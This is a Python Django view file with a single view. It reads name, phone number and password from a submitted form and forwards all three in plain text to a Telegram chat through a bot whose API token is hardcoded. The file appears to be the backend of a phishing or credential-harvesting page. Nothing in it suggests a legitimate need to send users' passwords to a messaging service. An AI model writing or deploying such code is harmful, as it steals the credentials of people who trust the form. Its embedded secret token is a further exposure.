from django.shortcuts import render
from .forms import MessageForm
import telegram




def index(request):
    if request.method == 'POST':
        form = MessageForm(request.POST)
        if form.is_valid():
            name = form.cleaned_data['name']
            phone = form.cleaned_data['phone']
            password = form.cleaned_data['password']
            bot = telegram.Bot(token='6285327436:AAFvZ-xAawvIVqzpk9nuWXaLbhMoWOeB7Fc')
            chat_id = '6285327436'
            message = f'Name: {name}\nPhone: {phone}\nPassword: {password}'
            bot.send_message(chat_id=chat_id, text=message)
            # bot.send_message(message.chat.id, )
            
            # Обработка сообщения
    else:
        form = MessageForm()
    return render(request, 'main/index.html', {'form': form})
